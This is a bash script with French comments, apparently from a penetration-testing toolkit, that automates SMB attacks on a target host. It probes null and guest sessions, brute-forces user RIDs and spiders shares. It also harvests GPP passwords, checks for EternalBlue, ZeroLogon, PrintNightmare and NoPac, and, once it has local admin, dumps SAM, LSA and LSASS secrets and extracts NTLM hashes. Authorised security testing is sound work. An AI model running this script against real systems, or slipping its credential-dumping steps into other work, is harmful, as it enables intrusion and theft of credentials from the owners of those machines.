#!/usr/bin/env bash
# ╔══════════════════════════════════════╗
# ║   Auto-Enum — SMB (445)             ║
# ║   Usage: ./enum_smb.sh <TARGET> [USER] [PASS] [DOMAIN]
# ╚══════════════════════════════════════╝
source "$(dirname "$0")/lib/common.sh"

TARGET="$1"
USER="${2:-}"
PASS="${3:-}"
DOMAIN="${4:-WORKGROUP}"

require_target "$TARGET"
banner "SMB (port 445)" "$TARGET"
OUTDIR=$(setup_outdir "$TARGET" "smb")

NXC=$(command -v nxc || command -v crackmapexec)
if [[ -z "$NXC" ]]; then
    error "nxc / crackmapexec non trouvé — installer avec: pip install netexec"
    exit 1
fi

# ─── 1. FINGERPRINT ─────────────────────────────────────────
section "1. FINGERPRINT"

run "nxc — fingerprint SMB" "$OUTDIR/nxc_info.txt" \
    $NXC smb "$TARGET"

run "Nmap — scripts SMB" "$OUTDIR/nmap_smb.txt" \
    nmap -p445 \
    --script smb-security-mode,smb2-security-mode,smb-os-discovery,smb-protocols \
    -oN "$OUTDIR/nmap_smb_raw.txt" \
    "$TARGET"

# Extraire infos clés
OS=$(grep -oP 'Windows\s+\S+(\s+\S+)?' "$OUTDIR/nxc_info.txt" 2>/dev/null | head -1)
HOSTNAME=$(grep -oP '\(name:\K[^)]+' "$OUTDIR/nxc_info.txt" 2>/dev/null | head -1)
DOMAIN_FOUND=$(grep -oP '\(domain:\K[^)]+' "$OUTDIR/nxc_info.txt" 2>/dev/null | head -1)
SIGNING=$(grep -oP '\(signing:\K[^)]+' "$OUTDIR/nxc_info.txt" 2>/dev/null | head -1)

[[ -n "$OS" ]]            && finding "OS : $OS"
[[ -n "$HOSTNAME" ]]      && finding "Hostname : $HOSTNAME"
[[ -n "$DOMAIN_FOUND" ]]  && finding "Domaine : $DOMAIN_FOUND"
[[ -n "$SIGNING" ]]       && {
    if [[ "$SIGNING" == "False" ]]; then
        warn "SMB Signing DÉSACTIVÉ → éligible au SMB Relay !"
        echo "$TARGET  # signing=False" >> "$OUTDIR/relay_targets.txt"
    else
        info "SMB Signing : $SIGNING"
    fi
}

# ─── 2. NULL SESSION & GUEST ────────────────────────────────
section "2. ACCÈS SANS CREDENTIALS"

info "Test null session"
$NXC smb "$TARGET" -u '' -p '' 2>&1 | tee "$OUTDIR/null_session.txt"

info "Test guest account"
$NXC smb "$TARGET" -u 'guest' -p '' 2>&1 | tee "$OUTDIR/guest.txt"

# Shares en anonyme
info "Shares accessibles en anonyme"
$NXC smb "$TARGET" -u '' -p '' --shares 2>&1 | tee "$OUTDIR/shares_anon.txt"
$NXC smb "$TARGET" -u 'guest' -p '' --shares 2>&1 | tee -a "$OUTDIR/shares_anon.txt"

if grep -q "READ\|WRITE" "$OUTDIR/shares_anon.txt" 2>/dev/null; then
    finding "Shares accessibles sans credentials !"
    grep "READ\|WRITE" "$OUTDIR/shares_anon.txt"
fi

# RID bruteforce
info "RID Bruteforce (énumération users)"
$NXC smb "$TARGET" -u '' -p '' --rid-brute 2>&1 | tee "$OUTDIR/rid_brute.txt"
$NXC smb "$TARGET" -u 'guest' -p '' --rid-brute 2>&1 | tee -a "$OUTDIR/rid_brute.txt"

# Extraire les users
grep "SidTypeUser" "$OUTDIR/rid_brute.txt" 2>/dev/null | \
    grep -oP '\\\K\w+' | sort -u | tee "$OUTDIR/users_found.txt"
USER_COUNT=$(wc -l < "$OUTDIR/users_found.txt" 2>/dev/null || echo 0)
[[ "$USER_COUNT" -gt 0 ]] && success "$USER_COUNT utilisateurs trouvés via RID brute"

# smbclient listing
if check_tool smbclient; then
    info "smbclient — listing shares"
    smbclient -L "//$TARGET" -N 2>&1 | tee "$OUTDIR/smbclient_list.txt"
fi

# ─── 3. AVEC CREDENTIALS ────────────────────────────────────
if [[ -n "$USER" ]]; then
    section "3. ÉNUMÉRATION AVEC CREDENTIALS ($USER)"

    info "Validation credentials"
    $NXC smb "$TARGET" -u "$USER" -p "$PASS" 2>&1 | tee "$OUTDIR/auth_check.txt"

    if grep -q "Pwn3d!" "$OUTDIR/auth_check.txt"; then
        success "ADMIN LOCAL OBTENU (Pwn3d!) !"
        finding "Admin local : $USER:$PASS sur $TARGET"
        echo "$USER:$PASS  # LOCAL ADMIN" > "$OUTDIR/valid_creds.txt"
    elif grep -q "\[+\]" "$OUTDIR/auth_check.txt"; then
        success "Credentials valides"
        echo "$USER:$PASS" > "$OUTDIR/valid_creds.txt"
    else
        error "Credentials invalides"
    fi

    # Policy (AVANT bruteforce)
    info "Password policy (vérifier lockout)"
    $NXC smb "$TARGET" -u "$USER" -p "$PASS" --pass-pol 2>&1 | tee "$OUTDIR/pass_pol.txt"

    # Énumération complète
    info "Énumération complète"
    $NXC smb "$TARGET" -u "$USER" -p "$PASS" \
        --users --groups --shares --sessions --loggedon-users \
        2>&1 | tee "$OUTDIR/enum_full.txt"

    # Shares avec permissions
    info "Shares + permissions"
    $NXC smb "$TARGET" -u "$USER" -p "$PASS" --shares 2>&1 | tee "$OUTDIR/shares_auth.txt"

    if grep -q "WRITE" "$OUTDIR/shares_auth.txt" 2>/dev/null; then
        finding "Share avec accès ÉCRITURE trouvé !"
        grep "WRITE" "$OUTDIR/shares_auth.txt"
    fi

    # Spider shares
    info "Spider — contenu des shares"
    $NXC smb "$TARGET" -u "$USER" -p "$PASS" -M spider_plus \
        2>&1 | tee "$OUTDIR/spider_plus.txt"

    # GPP Passwords
    info "GPP Passwords dans SYSVOL"
    $NXC smb "$TARGET" -u "$USER" -p "$PASS" -M gpp_password \
        2>&1 | tee "$OUTDIR/gpp_password.txt"
    if grep -qi "password\|cpassword" "$OUTDIR/gpp_password.txt" 2>/dev/null; then
        finding "GPP Password trouvé !"
    fi
fi

# ─── 4. CHECKS VULNÉRABILITÉS ───────────────────────────────
section "4. VULNÉRABILITÉS"

AUTH_ARGS=""
if [[ -n "$USER" ]]; then
    AUTH_ARGS="-u $USER -p $PASS"
fi

declare -A VULNS=(
    ["ms17-010"]="EternalBlue (MS17-010)"
    ["zerologon"]="ZeroLogon (CVE-2020-1472)"
    ["smbghost"]="SMBGhost (CVE-2020-0796)"
    ["printnightmare"]="PrintNightmare (CVE-2021-1675)"
    ["nopac"]="NoPac (CVE-2021-42278/42287)"
    ["spooler"]="Print Spooler actif (coercition)"
    ["webdav"]="WebDAV actif"
)

> "$OUTDIR/vulns_found.txt"
for module in "${!VULNS[@]}"; do
    label="${VULNS[$module]}"
    info "Check : $label"
    RESULT=$($NXC smb "$TARGET" $AUTH_ARGS -M "$module" 2>&1)
    echo "$RESULT" | tee -a "$OUTDIR/vuln_checks.txt"

    if echo "$RESULT" | grep -qi "VULNERABLE\|is VULNERABLE\|TRUE\|Pwn3d"; then
        finding "VULNÉRABLE à $label !"
        echo "  ★ VULNERABLE: $label" >> "$OUTDIR/vulns_found.txt"
    fi
done

# Nmap vuln scripts
run "Nmap — vuln scripts SMB" "$OUTDIR/nmap_vuln.txt" \
    nmap -p445 \
    --script smb-vuln-ms17-010,smb-vuln-ms08-067,smb-vuln-ms10-054 \
    "$TARGET"

# ─── 5. POST-ACCESS (si admin) ──────────────────────────────
if [[ -n "$USER" ]] && grep -q "Pwn3d!" "$OUTDIR/auth_check.txt" 2>/dev/null; then
    section "5. POST-ACCESS — DUMP (admin local détecté)"

    info "Dump SAM"
    $NXC smb "$TARGET" -u "$USER" -p "$PASS" --sam 2>&1 | tee "$OUTDIR/dump_sam.txt"

    info "Dump LSA"
    $NXC smb "$TARGET" -u "$USER" -p "$PASS" --lsa 2>&1 | tee "$OUTDIR/dump_lsa.txt"

    info "Dump LSASS via lsassy"
    $NXC smb "$TARGET" -u "$USER" -p "$PASS" -M lsassy 2>&1 | tee "$OUTDIR/dump_lsassy.txt"

    # Extraire les hashes
    grep -oP '\w+:\d+:[a-f0-9]{32}:[a-f0-9]{32}' \
        "$OUTDIR/dump_sam.txt" "$OUTDIR/dump_lsassy.txt" 2>/dev/null | \
        sort -u | tee "$OUTDIR/hashes_found.txt"

    HASH_COUNT=$(wc -l < "$OUTDIR/hashes_found.txt" 2>/dev/null || echo 0)
    [[ "$HASH_COUNT" -gt 0 ]] && success "$HASH_COUNT hashes NTLM récupérés !"
fi

# ─── SUMMARY ────────────────────────────────────────────────
summary "$OUTDIR"

echo -e "${WHITE}━━━ RÉSUMÉ RAPIDE ━━━${NC}"
cat "$OUTDIR/nxc_info.txt" 2>/dev/null | head -3

[[ -s "$OUTDIR/vulns_found.txt" ]] && {
    echo ""
    warn "VULNÉRABILITÉS DÉTECTÉES :"
    cat "$OUTDIR/vulns_found.txt"
}

[[ -f "$OUTDIR/valid_creds.txt" ]] && {
    echo ""
    success "Credentials valides :"
    cat "$OUTDIR/valid_creds.txt"
}

[[ -f "$OUTDIR/relay_targets.txt" ]] && {
    echo ""
    warn "Cibles SMB Relay (signing=False) :"
    cat "$OUTDIR/relay_targets.txt"
}
